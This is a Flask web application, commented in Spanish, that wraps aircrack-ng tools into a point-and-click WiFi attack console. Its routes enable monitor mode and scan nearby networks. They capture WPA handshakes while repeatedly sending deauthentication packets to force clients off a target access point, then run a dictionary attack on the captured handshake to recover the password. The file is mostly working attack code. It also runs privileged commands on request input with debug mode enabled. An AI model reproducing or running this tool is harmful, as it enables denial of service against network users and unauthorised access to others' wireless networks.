from flask import Flask, render_template, request, jsonify
import json
import subprocess
import os
import csv
import threading
import time
import logging

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads/'

# Asegúrate de que la carpeta de subida existe
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Variables globales para almacenar la interfaz y datos de la red
interface = ""
monitor_interface = None
handshake_file = "captura-01.cap"
bssid = ""
channel = ""
dictionary_path = ""

@app.route('/')
def index():
    return render_template('index01.html')


# Ruta para configurar la interfaz de red
@app.route('/set_interface', methods=['POST'])
def set_interface():
    global interface
    interface = request.form.get("interface")
    if interface:
        return jsonify({"status": f"Interfaz configurada a {interface}"})
    else:
        return jsonify({"status": "Error: No se proporcionó una interfaz"}), 400

# Ruta para iniciar el modo monitor
@app.route('/start_monitor', methods=['POST'])
def start_monitor():
    global monitor_interface
    if not interface:
        return jsonify({"status": "Error: No se ha configurado la interfaz de red"}), 400
    monitor_interface = f"{interface}"
    result = subprocess.run(["sudo", "airmon-ng", "start", interface], capture_output=True, text=True)
    if result.returncode != 0:
        return jsonify({"status": "Error al iniciar el modo monitor", "error": result.stderr}), 500
    return jsonify({"status": "Modo monitor iniciado", "interface": monitor_interface})



# Ruta para escanear redes WiFi y generar el CSV
@app.route('/scan_wifi', methods=['POST'])
def scan_networks():
    if not monitor_interface:
        return jsonify({"status": "Error: El modo monitor no está activo"}), 400

    # Archivo temporal para guardar la salida
    output_file = "airodump_output.csv"

    # Ejecutar airodump-ng con salida en CSV
    try:
        subprocess.run(
            ["sudo", "airodump-ng", "--write", output_file, "--output-format", "csv", monitor_interface],
            timeout=10,  # Escaneo de 10 segundos
            check=True
        )
    except subprocess.TimeoutExpired:
        pass  # Terminar el proceso si excede el tiempo

    # Leer el archivo CSV generado por airodump-ng
    networks = []
    if os.path.exists(f"{output_file}-01.csv"):
        with open(f"{output_file}-01.csv", "r") as file:
            csv_reader = csv.reader(file)
            for line in csv_reader:
                # Filtrar y parsear líneas relevantes
                if "Station MAC" in line or not line:
                    continue
                if len(line) >= 14:
                    bssid = line[0].strip()
                    pwr = line[8].strip()
                    channel = line[3].strip()
                    enc = line[5].strip()
                    essid = line[13].strip()
                    networks.append({
                        "bssid": bssid,
                        "pwr": pwr,
                        "channel": channel,
                        "encryption": enc,
                        "essid": essid
                    })
    else:
        return jsonify({"status": "Error: No se generó el archivo de salida"}), 500

    # Eliminar archivo temporal
    for file in [f"{output_file}-01.csv", f"{output_file}-01.kismet.csv"] :
        if os.path.exists(file):
            os.remove(file)

    return jsonify({"status": "Escaneo completo", "networks": networks})



# Ruta para obtener el archivo CSV guardado como JSON
@app.route('/get_saved_csv', methods=['GET'])
def get_saved_csv():
    # Ruta del archivo CSV generado por airodump-ng
    output_file = "airodump_output.csv"

    # Leer el archivo CSV y convertirlo en un diccionario
    networks = []
    if os.path.exists(f"{output_file}-01.csv"):
        with open(f"{output_file}-01.csv", "r") as file:
            csv_reader = csv.reader(file)
            for line in csv_reader:
                if "Station MAC" in line or not line:
                    continue
                if len(line) >= 14:
                    bssid = line[0].strip()
                    pwr = line[8].strip()
                    channel = line[3].strip()
                    enc = line[5].strip()
                    essid = line[13].strip()
                    networks.append({
                        "bssid": bssid,
                        "pwr": pwr,
                        "channel": channel,
                        "encryption": enc,
                        "essid": essid
                    })

    return jsonify(networks)  # Devolver los datos en formato JSON


# Función para capturar handshake
def capture_handshake_process(bssid, channel):
    capture_command = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "captura", monitor_interface]
    subprocess.Popen(capture_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  # Ejecutar captura en segundo plano

# Función para desautenticar clientes
def deauth_process(bssid):
    for _ in range(3):  # Repetir la desautenticación 3 veces
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, monitor_interface])
        time.sleep(1)  # Espera entre desautenticaciones

# Ruta para capturar handshake
@app.route('/capture_handshake', methods=['POST'])
def capture_handshake():
    global bssid, channel
    bssid = request.json.get("bssid")
    channel = request.json.get("channel")

    if not bssid or not channel:
        return jsonify({"status": "Error: BSSID o canal no proporcionados"}), 400

    # Ejecutar ambos procesos (captura y desautenticación) en hilos separados
    capture_thread = threading.Thread(target=capture_handshake_process, args=(bssid, channel))
    deauth_thread = threading.Thread(target=deauth_process, args=(bssid,))

    capture_thread.start()
    deauth_thread.start()

    capture_thread.join()  # Esperamos que la captura termine
    deauth_thread.join()  # Esperamos que la desautenticación termine

    return jsonify({"status": f"Capturando handshake para BSSID {bssid} en canal {channel}. Desautenticando clientes."})


# Ruta para desautenticar clientes
@app.route('/deauth', methods=['POST'])
def deauth():
    global bssid
    if not bssid:
        return jsonify({"status": "Error: BSSID no configurado"}), 400
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, monitor_interface])
    return jsonify({"status": f"Desautenticando clientes en BSSID {bssid}"})



@app.route('/crack_password', methods=['POST'])
def crack_password():
    # Obtener los archivos y datos del formulario
    dictionary_file = request.files.get('dictionary')
    capture_file = request.files.get('capture')
    bssid = request.form.get('bssid')

    # Depuración para verificar los datos recibidos
    print("Diccionario recibido:", dictionary_file)
    print("Archivo de captura recibido:", capture_file)
    print("BSSID recibido:", bssid)

    # Validar los datos
    if not dictionary_file or not capture_file or not bssid:
        return jsonify({"status": "Error", "message": "Faltan archivos o BSSID"}), 400

    try:
        # Guardar los archivos temporalmente
        dictionary_path = os.path.join("/tmp", dictionary_file.filename)
        capture_path = os.path.join("/tmp", capture_file.filename)
        dictionary_file.save(dictionary_path)
        capture_file.save(capture_path)
        print(f"Archivos guardados: {dictionary_path}, {capture_path}")
    except Exception as e:
        return jsonify({"status": "Error", "message": f"Error al guardar archivos: {str(e)}"}), 500

    try:
        # Ejecutar aircrack-ng
        crack_command = ["sudo", "aircrack-ng", "-w", dictionary_path, "-b", bssid, capture_path]
        print(f"Ejecutando comando: {' '.join(crack_command)}")
        result = subprocess.run(crack_command, capture_output=True, text=True)

        if result.returncode != 0:
            return jsonify({
                "status": "Error",
                "message": "Error al crackear la contraseña",
                "error": result.stderr,
            }), 500

        return jsonify({"status": "Success", "output": result.stdout})
    except Exception as e:
        return jsonify({"status": "Error", "message": f"Error al ejecutar el comando: {str(e)}"}), 500

        
if __name__ == "__main__":
    app.run(debug=True)





# Ruta para detener el modo monitor
@app.route('/stop_monitor', methods=['POST'])
def stop_monitor():
    global monitor_interface
    if monitor_interface:
        subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface])
        monitor_interface = None
        return jsonify({"status": "Modo monitor detenido"})
    else:
        return jsonify({"status": "Error: Modo monitor no está activo"}), 400

if __name__ == "__main__":
    app.run(debug=True)